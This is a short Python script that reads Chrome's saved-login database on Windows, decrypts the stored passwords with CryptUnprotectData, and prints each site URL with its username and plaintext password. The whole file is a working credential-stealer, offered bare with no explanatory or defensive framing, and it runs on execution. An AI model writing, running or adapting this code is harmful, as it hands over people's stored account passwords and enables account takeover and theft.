import os
import sqlite3
import win32crypt


def get_chrome_info():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    db_connection = sqlite3.connect(data_path)
    cursor = db_connection.cursor()
    query = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(query)

    login_data = cursor.fetchall()
    print(login_data)
    cred = {}
    string = ''

    for url, username, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (username, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url, username, pwd[1].decode('utf8'))
        print(string)


get_chrome_info()